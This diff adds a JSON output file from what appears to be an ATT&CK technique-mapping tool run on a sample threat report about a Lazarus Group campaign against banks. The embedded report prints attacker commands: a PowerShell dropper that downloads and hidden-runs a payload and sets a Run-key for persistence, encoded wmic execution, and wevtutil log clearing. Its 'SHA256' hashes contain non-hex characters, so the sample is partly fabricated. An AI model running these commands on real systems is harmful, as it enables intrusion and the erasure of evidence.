@@ -1,0 +1,605 @@
+{
+  "timestamp": "20251013_144756",
+  "total_files": 1,
+  "successful": 1,
+  "failed": 0,
+  "total_techniques": 26,
+  "total_processing_time": 68.0281548500061,
+  "average_time_per_file": 68.0281548500061,
+  "configuration": {
+    "workers": 3,
+    "chunk_size": 3000,
+    "max_chunks": 10,
+    "use_api": false
+  },
+  "files": [
+    {
+      "file": "markdown_threat_report.md",
+      "path": "samples/reports/markdown_threat_report.md",
+      "status": "success",
+      "techniques": [
+        "T1566.001",
+        "T1078",
+        "T1110.003",
+        "T1203",
+        "T1586",
+        "T1059.001",
+        "T1027",
+        "T1562.001",
+        "T1055",
+        "T1059.003",
+        "T1047",
+        "T1059",
+        "T1202",
+        "T1564.003",
+        "T1053.005",
+        "T1071",
+        "T1027.013",
+        "T1027.002",
+        "T1070",
+        "T1070.001",
+        "T1003",
+        "T1558.003",
+        "T1003.001",
+        "T1056.001",
+        "T1021.001",
+        "T1486"
+      ],
+      "count": 26,
+      "processing_time": 67.1,
+      "chunks_used": 3,
+      "error": null,
+      "text_length": 7204,
+      "technique_details": {
+        "T1566.001": {
+          "name": "Spearphishing Attachment",
+          "confidence": 100,
+          "evidence": [
+            "The threat actors employed multiple initial access vectors:\n\n- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services"
+          ],
+          "line_refs": [
+            21,
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30
+          ]
+        },
+        "T1078": {
+          "name": "Valid Accounts",
+          "confidence": 100,
+          "evidence": [
+            "The threat actors employed multiple initial access vectors:\n\n- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services"
+          ],
+          "line_refs": [
+            21,
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30
+          ]
+        },
+        "T1110.003": {
+          "name": "Password Spraying",
+          "confidence": 90,
+          "evidence": [
+            "The threat actors employed multiple initial access vectors:\n\n- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services"
+          ],
+          "line_refs": [
+            21,
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30
+          ]
+        },
+        "T1203": {
+          "name": "Exploitation for Client Execution",
+          "confidence": 90,
+          "evidence": [
+            "- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services\n\n#### Code Sample - Initial Dropper"
+          ],
+          "line_refs": [
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31,
+            32
+          ]
+        },
+        "T1586": {
+          "name": "Compromise Accounts",
+          "confidence": 90,
+          "evidence": [
+            "- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services\n\n#### Code Sample - Initial Dropper"
+          ],
+          "line_refs": [
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31,
+            32
+          ]
+        },
+        "T1059.001": {
+          "name": "PowerShell",
+          "confidence": 100,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1027": {
+          "name": "Obfuscated Files or Information",
+          "confidence": 100,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1562.001": {
+          "name": "Disable or Modify Tools",
+          "confidence": 95,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1055": {
+          "name": "Process Injection",
+          "confidence": 100,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1059.003": {
+          "name": "Windows Command Shell",
+          "confidence": 100,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1047": {
+          "name": "Windows Management Instrumentation",
+          "confidence": 95,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1059": {
+          "name": "Command and Scripting Interpreter",
+          "confidence": 80,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1202": {
+          "name": "Indirect Command Execution",
+          "confidence": 90,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1564.003": {
+          "name": "Hidden Window",
+          "confidence": 80,
+          "evidence": [
+            "The group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```"
+          ],
+          "line_refs": [
+            47,
+            48,
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57
+          ]
+        },
+        "T1053.005": {
+          "name": "Scheduled Task",
+          "confidence": 100,
+          "evidence": [
+            "1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```\n\n3. **Scheduled Task** (T1053.005)\n   - Created persistence through scheduled tasks\n   - Executed every 30 minutes for beacon callbacks"
+          ],
+          "line_refs": [
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57,
+            58,
+            59,
+            60,
+            61
+          ]
+        },
+        "T1071": {
+          "name": "Application Layer Protocol",
+          "confidence": 85,
+          "evidence": [
+            "1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```\n\n3. **Scheduled Task** (T1053.005)\n   - Created persistence through scheduled tasks\n   - Executed every 30 minutes for beacon callbacks"
+          ],
+          "line_refs": [
+            49,
+            50,
+            51,
+            52,
+            53,
+            54,
+            55,
+            56,
+            57,
+            58,
+            59,
+            60,
+            61
+          ]
+        },
+        "T1027.013": {
+          "name": "Encrypted/Encoded File",
+          "confidence": 95,
+          "evidence": [
+            "[...continued from previous section...]\nfeatures:\n\n- **Process Injection** (T1055)\n  - Injected into legitimate Windows processes\n  - Used `svchost.exe` and `explorer.exe` as hosts\n\n- **Obfuscated Files** (T1027)\n  - XOR encryption with rotating keys\n  - Packed with custom UPX variant"
+          ],
+          "line_refs": [
+            1,
+            2,
+            3,
+            4,
+            5,
+            6,
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        "T1027.002": {
+          "name": "Software Packing",
+          "confidence": 95,
+          "evidence": [
+            "[...continued from previous section...]\nfeatures:\n\n- **Process Injection** (T1055)\n  - Injected into legitimate Windows processes\n  - Used `svchost.exe` and `explorer.exe` as hosts\n\n- **Obfuscated Files** (T1027)\n  - XOR encryption with rotating keys\n  - Packed with custom UPX variant"
+          ],
+          "line_refs": [
+            1,
+            2,
+            3,
+            4,
+            5,
+            6,
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        "T1070": {
+          "name": "Indicator Removal",
+          "confidence": 100,
+          "evidence": [
+            "- **Process Injection** (T1055)\n  - Injected into legitimate Windows processes\n  - Used `svchost.exe` and `explorer.exe` as hosts\n\n- **Obfuscated Files** (T1027)\n  - XOR encryption with rotating keys\n  - Packed with custom UPX variant\n\n- **Indicator Removal** (T1070)\n  ```powershell\n  # Clear event logs\n  wevtutil cl Security\n  wevtutil cl System\n  wevtutil cl Application\n  ```"
+          ],
+          "line_refs": [
+            4,
+            5,
+            6,
+            7,
+            8,
+            9,
+            10,
+            11,
+            12,
+            13,
+            14,
+            15,
+            16,
+            17,
+            18
+          ]
+        },
+        "T1070.001": {
+          "name": "Clear Windows Event Logs",
+          "confidence": 95,
+          "evidence": [
+            "- **Process Injection** (T1055)\n  - Injected into legitimate Windows processes\n  - Used `svchost.exe` and `explorer.exe` as hosts\n\n- **Obfuscated Files** (T1027)\n  - XOR encryption with rotating keys\n  - Packed with custom UPX variant\n\n- **Indicator Removal** (T1070)\n  ```powershell\n  # Clear event logs\n  wevtutil cl Security\n  wevtutil cl System\n  wevtutil cl Application\n  ```"
+          ],
+          "line_refs": [
+            4,
+            5,
+            6,
+            7,
+            8,
+            9,
+            10,
+            11,
+            12,
+            13,
+            14,
+            15,
+            16,
+            17,
+            18
+          ]
+        },
+        "T1003": {
+          "name": "OS Credential Dumping",
+          "confidence": 100,
+          "evidence": [
+            "The attackers systematically harvested credentials:\n\n| Technique | Tool Used | Purpose |\n|-----------|-----------|---------|\n| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |\n| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |\n| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |\n| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |\n\n### 6."
+          ],
+          "line_refs": [
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31
+          ]
+        },
+        "T1558.003": {
+          "name": "Kerberoasting",
+          "confidence": 100,
+          "evidence": [
+            "The attackers systematically harvested credentials:\n\n| Technique | Tool Used | Purpose |\n|-----------|-----------|---------|\n| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |\n| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |\n| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |\n| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |\n\n### 6."
+          ],
+          "line_refs": [
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31
+          ]
+        },
+        "T1003.001": {
+          "name": "LSASS Memory",
+          "confidence": 100,
+          "evidence": [
+            "The attackers systematically harvested credentials:\n\n| Technique | Tool Used | Purpose |\n|-----------|-----------|---------|\n| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |\n| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |\n| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |\n| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |\n\n### 6."
+          ],
+          "line_refs": [
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31
+          ]
+        },
+        "T1056.001": {
+          "name": "Keylogging",
+          "confidence": 100,
+          "evidence": [
+            "The attackers systematically harvested credentials:\n\n| Technique | Tool Used | Purpose |\n|-----------|-----------|---------|\n| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |\n| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |\n| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |\n| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |\n\n### 6."
+          ],
+          "line_refs": [
+            22,
+            23,
+            24,
+            25,
+            26,
+            27,
+            28,
+            29,
+            30,
+            31
+          ]
+        },
+        "T1021.001": {
+          "name": "Remote Desktop Protocol",
+          "confidence": 75,
+          "evidence": [
+            "## MITRE ATT&CK Navigator Layer\n\n```json\n{\n  \"name\": \"Lazarus Financial Campaign 2024\",\n  \"versions\": {\n    \"attack\": \"14\",\n    \"navigator\": \"4.9.1\"\n  },\n  \"techniques\": [\n    {\"techniqueID\": \"T1566.001\", \"score\": 100},\n    {\"techniqueID\": \"T1059.001\", \"score\": 100},\n    {\"techniqueID\": \"T1055\", \"score\": 85},\n    {\"techniqueID\": \"T1003\", \"score\": 90},\n    {\"techniqueID\": \"T1021.001\", \"score\": 75},\n    {\"techniqueID\": \"T1486\", \"score\": 100}\n  ]\n}\n```\n\n## Conclusion"
+          ],
+          "line_refs": [
+            29,
+            30,
+            31,
+            32,
+            33,
+            34,
+            35,
+            36,
+            37,
+            38,
+            39,
+            40,
+            41,
+            42,
+            43,
+            44,
+            45,
+            46,
+            47,
+            48,
+            49
+          ]
+        },
+        "T1486": {
+          "name": "Data Encrypted for Impact",
+          "confidence": 100,
+          "evidence": [
+            "## MITRE ATT&CK Navigator Layer\n\n```json\n{\n  \"name\": \"Lazarus Financial Campaign 2024\",\n  \"versions\": {\n    \"attack\": \"14\",\n    \"navigator\": \"4.9.1\"\n  },\n  \"techniques\": [\n    {\"techniqueID\": \"T1566.001\", \"score\": 100},\n    {\"techniqueID\": \"T1059.001\", \"score\": 100},\n    {\"techniqueID\": \"T1055\", \"score\": 85},\n    {\"techniqueID\": \"T1003\", \"score\": 90},\n    {\"techniqueID\": \"T1021.001\", \"score\": 75},\n    {\"techniqueID\": \"T1486\", \"score\": 100}\n  ]\n}\n```\n\n## Conclusion"
+          ],
+          "line_refs": [
+            29,
+            30,
+            31,
+            32,
+            33,
+            34,
+            35,
+            36,
+            37,
+            38,
+            39,
+            40,
+            41,
+            42,
+            43,
+            44,
+            45,
+            46,
+            47,
+            48,
+            49
+          ]
+        }
+      },
+      "average_confidence": 0.9442307692307692,
+      "text_content": "# Lazarus Group Financial Sector Campaign - Q4 2024\n\n## Executive Summary\n\nThe **Lazarus Group** has launched a sophisticated campaign targeting financial institutions worldwide, focusing on SWIFT payment systems and cryptocurrency exchanges. This report provides detailed analysis of their latest tactics, techniques, and procedures (TTPs).\n\n## Attack Timeline\n\n| Date | Event | Impact |\n|------|-------|--------|\n| 2024-10-01 | Initial reconnaissance begins | Target identification |\n| 2024-10-15 | First spearphishing wave | 3 organizations compromised |\n| 2024-10-22 | Lateral movement observed | Network-wide access achieved |\n| 2024-11-01 | Data exfiltration begins | 500GB+ stolen |\n| 2024-11-10 | Ransomware deployment | Systems encrypted |\n\n## Attack Chain Analysis\n\n### 1. Initial Access\n\nThe threat actors employed multiple initial access vectors:\n\n- **Spearphishing Attachment** (T1566.001)\n  - Malicious Excel documents with embedded macros\n  - Exploits CVE-2024-5678 in Microsoft Office\n  - Targets: Finance department employees\n\n- **Valid Accounts** (T1078)\n  - Compromised VPN credentials from previous breaches\n  - Password spraying against exposed services\n\n#### Code Sample - Initial Dropper\n\n```powershell\n# Decoded PowerShell from macro\n$url = \"https://legitimate-site[.]com/update.dat\"\n$path = \"$env:TEMP\\svchost.exe\"\nInvoke-WebRequest -Uri $url -OutFile $path\nStart-Process $path -WindowStyle Hidden\n\n# Persistence via Registry\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityUpdate\" /t REG_SZ /d \"$path\" /f\n```\n\n### 2. Execution Techniques\n\nThe group utilized sophisticated execution methods:\n\n1. **PowerShell** (T1059.001)\n   - Base64-encoded commands\n   - AMSI bypass techniques\n   - Fileless execution in memory\n\n2. **Windows Command Shell** (T1059.003)\n   ```cmd\n   cmd.exe /c \"wmic process call create 'powershell.exe -w hidden -enc <base64>'\"\n   ```\n\n3. **Scheduled Task** (T1053.005)\n   - Created persistence through scheduled tasks\n   - Executed every 30 minutes for beacon callbacks\n\n### 3. Persistence Mechanisms\n\nMultiple persistence techniques ensure continued access:\n\n> **Note:** The attackers showed exceptional operational security by using different persistence methods on different systems to avoid pattern detection.\n\n- Registry Run Keys (T1547.001)\n- Scheduled Tasks (T1053.005)\n- Service Creation (T1543.003)\n- WMI Event Subscriptions (T1546.003)\n\n### 4. Defense Evasion\n\n#### Anti-Analysis Techniques\n\nThe malware employed several anti-analysis features:\n\n- **Process Injection** (T1055)\n  - Injected into legitimate Windows processes\n  - Used `svchost.exe` and `explorer.exe` as hosts\n\n- **Obfuscated Files** (T1027)\n  - XOR encryption with rotating keys\n  - Packed with custom UPX variant\n\n- **Indicator Removal** (T1070)\n  ```powershell\n  # Clear event logs\n  wevtutil cl Security\n  wevtutil cl System\n  wevtutil cl Application\n  ```\n\n### 5. Credential Access\n\nThe attackers systematically harvested credentials:\n\n| Technique | Tool Used | Purpose |\n|-----------|-----------|---------|\n| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |\n| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |\n| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |\n| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |\n\n### 6. Discovery\n\nExtensive reconnaissance was performed:\n\n- `net user /domain` - Enumerate domain users\n- `net group \"Domain Admins\" /domain` - Identify high-value accounts\n- `nltest /dclist` - Locate domain controllers\n- `arp -a` - Map local network\n\n### 7. Lateral Movement\n\nThe group moved laterally using:\n\n1. **Remote Desktop Protocol** (T1021.001)\n2. **Windows Admin Shares** (T1021.002)\n3. **PsExec** (S0029)\n4. **WMI** (T1047)\n\nExample WMI command for remote execution:\n```\nwmic /node:\"target-host\" process call create \"cmd.exe /c powershell.exe -enc <base64>\"\n```\n\n### 8. Collection\n\nData collection focused on:\n\n- **Email Collection** (T1114)\n  - Targeted executive communications\n  - Search for keywords: \"wire\", \"transfer\", \"SWIFT\"\n\n- **Data from Local System** (T1005)\n  - Financial records\n  - Customer databases\n  - SWIFT configuration files\n\n### 9. Command and Control\n\n#### C2 Infrastructure\n\n- **Web Protocols** (T1071.001)\n  - HTTPS with custom headers\n  - Domain fronting via CDNs\n\n- **Dead Drop Resolver** (T1102.001)\n  - Used compromised WordPress sites\n  - Encoded commands in image EXIF data\n\n#### C2 Domains\n\n```\nfinancial-update[.]com\nsecure-bank-portal[.]net\nswift-validator[.]org\n```\n\n### 10. Exfiltration\n\nData was exfiltrated through multiple channels:\n\n- **Exfiltration Over C2 Channel** (T1041)\n  - Chunked transfers to avoid detection\n  - Encrypted with AES-256\n\n- **Exfiltration to Cloud Storage** (T1567.002)\n  - Used compromised OneDrive accounts\n  - Appeared as legitimate business activity\n\n### 11. Impact\n\nThe final stage involved:\n\n- **Data Encrypted for Impact** (T1486)\n  - Deployed custom ransomware variant\n  - Encrypted file extensions: `.lazarus`\n  \n- **Financial Theft**\n  - Attempted SWIFT transfers totaling $50M\n  - Cryptocurrency wallet drainage\n\n## Indicators of Compromise (IOCs)\n\n### File Hashes (SHA256)\n\n```\n3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f\n9f8e7d6c5b4a3m2n1b0v9c8x7z6a5s4d3f2g1h0j9k8l7p6o5i4u3y2t1r0e9w8\n```\n\n### Network Indicators\n\n- C2 Server: `185.174.137[.]42`\n- User-Agent: `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; LazarusBot)`\n\n### Registry Keys\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\LazarusSvc\n```\n\n## Defensive Recommendations\n\n### Immediate Actions\n\n1. **Block IOCs** at network and endpoint levels\n2. **Reset credentials** for all privileged accounts\n3. **Audit PowerShell usage** and enable ScriptBlock logging\n4. **Review scheduled tasks** for suspicious entries\n\n### Long-term Mitigations\n\n- Implement **application whitelisting**\n- Deploy **EDR solutions** with behavioral detection\n- Enable **multi-factor authentication** universally\n- Conduct regular **threat hunting** exercises\n- Implement **network segmentation** for critical systems\n\n## MITRE ATT&CK Navigator Layer\n\n```json\n{\n  \"name\": \"Lazarus Financial Campaign 2024\",\n  \"versions\": {\n    \"attack\": \"14\",\n    \"navigator\": \"4.9.1\"\n  },\n  \"techniques\": [\n    {\"techniqueID\": \"T1566.001\", \"score\": 100},\n    {\"techniqueID\": \"T1059.001\", \"score\": 100},\n    {\"techniqueID\": \"T1055\", \"score\": 85},\n    {\"techniqueID\": \"T1003\", \"score\": 90},\n    {\"techniqueID\": \"T1021.001\", \"score\": 75},\n    {\"techniqueID\": \"T1486\", \"score\": 100}\n  ]\n}\n```\n\n## Conclusion\n\nThe Lazarus Group continues to evolve their TTPs, demonstrating increased sophistication in targeting financial institutions. Their use of **living-off-the-land** techniques, combined with custom malware and robust operational security, makes detection and attribution challenging. Organizations must adopt a defense-in-depth strategy and maintain vigilant monitoring to detect and respond to these advanced threats.\n\n---\n\n*Report compiled by Threat Intelligence Team*  \n*Classification: TLP:WHITE*  \n*Last Updated: 2024-11-15*",
+      "entities": {
+        "entities": [],
+        "extraction_status": "no_entities_found"
+      },
+      "flow": null
+    }
+  ]
+}
